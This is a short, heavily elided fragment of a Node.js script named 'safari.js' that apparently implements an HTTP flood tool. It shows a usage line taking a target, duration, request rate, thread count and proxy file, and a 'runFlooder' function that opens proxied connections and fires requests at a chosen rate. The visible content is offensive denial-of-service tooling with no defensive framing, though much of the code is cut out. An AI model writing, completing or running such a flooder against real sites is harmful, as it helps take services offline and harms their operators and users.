...
if (process.argv.length < 7) {
  console.log(`node safari.js [target] [time] [rate] [thread] [proxy]`);
  console.log(`optional: --path --delay=ms`);
  process.exit();
}
...
function runFlooder() {
    ...
    Socker.HTTP(proxyOptions, (connection, error) => {
        ...
        client.on("connect", () => {
            const requestInterval = args.delay > 0 ? args.delay : 1000;
            const requestsPerInterval = args.delay > 0 ? 1 : args.Rate;
